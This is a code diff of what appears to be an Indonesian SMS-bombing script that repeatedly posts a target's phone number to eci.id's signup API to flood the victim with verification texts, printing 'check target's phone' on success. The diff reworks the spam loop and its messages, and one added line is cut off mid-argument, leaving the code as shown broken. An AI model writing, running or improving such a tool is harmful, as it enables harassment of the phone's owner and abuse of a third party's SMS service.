@@ -121,6 +121,7 @@ print(f"{H}∎")
 time.sleep(1.5)
 print(f"{H}∎")
 time.sleep(1.5)
+# Headers
 headers_eci = {
 "Host" : "eci.id",
 "Connection" : "keep-alive",
@@ -132,22 +133,22 @@ headers_eci = {
 "Referer" : "https://eci.id/register",
 "Accept-Encoding" : "gzip, deflate, br",
 "Accept-Language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-
+# Data
 data_eci = json.dumps({"identity":"0"+nomer})
+
 for k in range(jumlah):
-        k += 1
-	pos_eci = requests.post("https://eci.id/api/signup",headers=headers_eci,data=data_eci).text
-
-if "success" in pos_eci:
-    print(f"{H}∎")
-    time.sleep(1.2)
-    print(f"{K}∎∎∎ Cek Hp Target ∎∎∎ ",k)
-
-else:
-    print(f"{H}∎")
-    time.sleep(1.2)
-    print(f"{M}∎∎∎ Maaf Gagal ∎∎∎ ",k)
-    time.sleep(1)
+  k += 1
+  pos_eci = requests.post("https://eci.id/api/signup",headers=headers>
+  if "success" in pos_eci:
+    time.sleep(3)
+    print(f"{H}____________________________________________")
+    print(f"{P}--> SMS ECI MASUK",k)
+  else:
+    time.sleep(3)
+    print(f"{H}____________________________________________")
+    print(f"{M}--> MAAF SMS ECI GAGAL",k)
+    print("")
+    time.sleep(2)
 os.system("clear")
 os.system("python KingSpam.py")
 
